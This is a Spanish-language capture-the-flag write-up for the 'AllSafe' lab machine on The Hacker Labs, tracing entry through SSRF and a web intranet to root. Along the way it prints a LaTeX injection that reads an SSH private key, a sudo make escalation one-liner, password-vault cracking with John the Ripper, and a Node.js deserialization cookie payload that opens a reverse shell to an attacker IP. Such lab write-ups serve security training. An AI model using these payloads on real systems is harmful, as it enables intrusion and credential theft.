
# ALLSAFE - The Hacker Labs 🚀

¡Bienvenido a este emocionante write-up de la máquina ALLSAFE de The Hacker Labs! Prepárate para un viaje lleno de enumeración, explotación y escalada de privilegios que te llevará desde un contenedor hasta la raíz del sistema.

## 📌 Información General

*   **Nombre de la máquina:** AllSafe
*   **Plataforma:** The Hacker Labs
*   **Dificultad:** Profesional
*   **Creador:** d4redevil
*   **OS:** Linux
*   **Objetivos:** Obtener la Flag de usuario y de root.

---

## 🔍 Enumeración Inicial

Nuestra aventura comienza con el descubrimiento de la máquina AllSafe, que presenta la IP `10.0.5.24`.

### 🌐 Descubrimiento de Puertos

Un escaneo inicial revela los siguientes puertos abiertos:

```
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Tenemos dos servicios SSH (en los puertos 22 y 2222) y un servicio web Apache en el puerto 80.

### 🕸️ Puerto 80 - El Portal Web

Al acceder a `10.0.5.24` mediante un navegador, nos encontramos con la web de una empresa de ciberseguridad.

![home_80](https://i.imgur.com/XXXXXXXX.png)

Un vistazo al código fuente revela la presencia de **Virtual Hosting**. ¡Es hora de configurar nuestro `/etc/hosts`!

```
10.0.5.24 allsafe.thl
```

Ahora, al acceder a `allsafe.thl`, la web responde correctamente.

### 📁 Explorando Subdirectorios y Ocultos

Los subdirectorios principales son:
*   `index.php`
*   `our-history.php`
*   `our-team.php`
*   `contact.php`

Un fuzzing con `gobuster` no arroja resultados interesantes. Sin embargo, en `our-team.php`, los perfiles de los empleados nos dan pistas sobre posibles nombres de usuario. Además, una foto llama la atención: ¡una **credencial** está visible en ella!

![parker_image](https://i.imgur.com/XXXXXXXX.png)

El formulario en `contact.php` parece simple, pero al intentar un **Server-Side Request Forgery (SSRF)** en el campo "sitio web" y probando con `http://localhost`, obtenemos un mensaje peculiar: `123456Seven`. ¡Podría ser una contraseña!

### 🏠 Descubriendo Subdominios

Ante la falta de avances en los subdirectorios directos, empleamos `wfuzz` para buscar subdominios y ¡éxito! Descubrimos `intranet.allsafe.thl`. Lo añadimos a nuestro `/etc/hosts`:

```
10.0.5.24 allsafe.thl intranet.allsafe.thl
```

### 🖥️ El Panel de Intranet

Acceder a `intranet.allsafe.thl` nos presenta un panel de login que requiere un "ID de empleado" (con el formato `X-XXX-XXXX`) y una contraseña.

Antes de intentar credenciales, realizamos un fuzzing de subdirectorios en la intranet. El directorio `/process` se muestra prometedor.

Dentro de `/process`, encontramos el subdirectorio `output`, que contiene documentos PDF y otros archivos generados con **LaTeX**. Sorprendentemente, algunos PDFs revelan el contenido de `/etc/passwd` y claves `id_rsa` del usuario `parker`.

![etc-passwd-doc](https://i.imgur.com/XXXXXXXX.png)

Aunque estas `id_rsa` no permiten el acceso directo por SSH, un análisis más profundo de los archivos `.tex` en `output` revela una **inyección de LaTeX** en el campo "Empresa". ¡Esta es nuestra próxima vía de explotación!

---

## 🔥 Explotación

### 🔐 Acceso a la Intranet

Con los nombres de usuario (`parker`) y la contraseña (`123456Seven`) en mano, nos dirigimos al panel de login de `intranet.allsafe.thl`. Usamos el ID de empleado `0-477-9990` y la contraseña obtenida:

![login](https://i.imgur.com/XXXXXXXX.png)

¡Hemos logrado acceder!

### 📝 LaTeX Injection para Obtener la `id_rsa`

Dentro del panel, la opción de "Nuevo Cliente" nos permite generar los documentos PDF. Sabemos que el campo "Empresa" es vulnerable a LaTeX Injection. Sin embargo, tras pruebas, descubrimos que los datos introducidos en "Empresa" se reflejan en el campo "Cliente". Por lo tanto, inyectaremos la **LaTeX Injection en el campo Cliente** para obtener la `id_rsa` correcta de `parker`.

Utilizamos la siguiente inyección para extraer la clave privada:

```latex
\lstinputlisting{/home/parker/.ssh/id_rsa}
```

Tras generar el documento y descargarlo, obtenemos la clave `id_rsa`. Es crucial **limpiar la clave**: eliminar espacios adicionales y corregir los guiones de apertura y cierre que a veces se pegan con formato incorrecto.

### 🔑 Acceso SSH al Contenedor

Una vez la `id_rsa` está limpia y con permisos (`chmod 600`), accedemos al servidor SSH en el puerto `2222` como el usuario `parker`:

```bash
ssh parker@10.0.5.24 -i id_rsa -p 2222
```

¡Estamos dentro! Un `hostname -I` nos confirma que estamos en un **contenedor** con la IP `172.18.0.3`. Nuestro siguiente objetivo es salir de él.

---

## 🧗 Escalada de Privilegios (Contenedor)

### ✉️ Descubriendo Credenciales en el Correo

Ejecutamos `env` y notamos un directorio de servicio de correo en `/var/mail/parker`. Al revisarlo, encontramos un archivo con información valiosa: una clave en formato hexadecimal.

```bash
echo '6D7033386E71556654416130494D314F70306157' | xxd -r -p
```

Esto nos revela la contraseña del usuario `goddard`: `mp38nqUfTAa0IM1Op0aW`.

### 👑 Escalada a `goddard`

Cambiamos de usuario a `goddard` y revisamos sus permisos `sudoers`.

```bash
sudo -l
```

Descubrimos que `goddard` puede ejecutar `make` como cualquier usuario. Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/make/#sudo), encontramos el exploit para escalar privilegios:

```bash
sudo /usr/bin/make -s --eval=$'x:\n\t-'/bin/bash
```

¡Ahora somos **root** dentro del contenedor!

### 📂 Acceso a la Flag Root del Contenedor

Navegamos al directorio `/root` y encontramos un archivo intrigante: `secrets.psafe3`. Para obtenerlo, lo copiamos al directorio web (`/var/www/allsafe`) y lo descargamos desde nuestro navegador.

Este archivo es una base de datos cifrada. Lo atacamos con **John the Ripper** y un diccionario `rockyou.txt` (reducido a las primeras 5000 contraseñas para agilizar).

```bash
pwsafe2john secrets.psafe3 > hash
john --wordlist=minirock hash
```

La contraseña obtenida es `rockandroll`. Al abrir `secrets.psafe3` con `pwsafe`, descubrimos información crucial: las credenciales del usuario **cisco**.

### 🔑 Acceso SSH a la Máquina Principal

Con las credenciales de `cisco` (`cisco:sMpam!dE#8@$$1P%bnV@fFxdqjFFG#`), accedemos al servicio SSH en el puerto `22` de la máquina principal.

```bash
ssh cisco@10.0.5.24 -i id_rsa_cisco -p 22
```

¡Hemos obtenido la **primera flag** (`user.txt`)!

### 🤫 Archivos Ocultos y Canales Seguros

En el directorio `/home/cisco`, encontramos `.unknown` y `darkarmy.bin`. `darkarmy.bin` contiene un hexadecimal que, al decodificarlo, nos da `password=drk2025!`, pero parece no ser útil.

El archivo `.unknown` habla de un **canal seguro** para comunicaciones, mencionando una sala: `dark-ops`.

### 📈 Descubriendo Servicios Internos

Analizamos los procesos (`ps -faux`) y los puertos de escucha (`ss -tulnp`) y detectamos un servicio interno corriendo en `127.0.0.1:3000`, ejecutado por `root` y probablemente relacionado con **Node.js**.

### 🌐 Acceso al Servicio Web Interno

Utilizamos `ssh -L` para crear un túnel y acceder a ese servicio:

```bash
ssh -L 3000:127.0.0.1:3000 cisco@10.0.5.24
```

Ahora podemos acceder a `localhost:3000` desde nuestro navegador.

### 💬 El Chat Seguro

Nos encontramos ante un panel de chat. Intentamos ingresar a la sala `dark-ops` con las credenciales de `cisco` y la contraseña de `darkarmy.bin`, pero sin éxito.

### 📜 Analizando Logs y Descubriendo Credenciales

Revisamos `/var/log` y encontramos el archivo `app.log`, accesible como `root`. Dentro, hallamos credenciales que nos permiten acceder al servicio de Node.js:

*   **Usuario:** `cisco`
*   **Sala:** `dark-ops`
*   **Contraseña:** `DLFJYxLLSzp1x5Ttpsffpg2awuJT5K`

### 🍪 La Cookie y la Vulnerabilidad

Tras interactuar con el chat, observamos la cookie de sesión: `eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D`. Al decodificarla de URL y luego de Base64, obtenemos `{"username":"cisco"}`. Esto nos indica que el servidor Node.js **deserializa la cookie**. ¡Estamos ante una **vulnerabilidad de deserialización**!

### 🚀 Payload para RCE

Construimos un payload de **Remote Code Execution (RCE)** usando una IIFE (Immediately Invoked Function Expression) para obtener una shell reversa:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/10.0.5.5/443 0>&1'\", function(error,stdout,stderr){})}()"}
```

Codificamos este payload en Base64 y lo preparamos para inyectarlo en la cookie.

### 👂 Escuchando y Obteniendo la Shell Root

Configuramos `netcat` para escuchar en el puerto `443`:

```bash
nc -nlvp 443
```

Sustituimos el valor de la cookie en el navegador con nuestro payload en Base64. En la consola del navegador, ejecutamos `socket.close()` y `socket.connect()` para forzar la deserialización.

¡Éxito! Recibimos una **shell root** desde el contenedor.

### 👑 Escalada de Privilegios Final

Tratamos la TTY y ahora somos **root** en la máquina principal.

---

## 🏆 ¡Flag de Root Obtenida!

Hemos obtenido control.
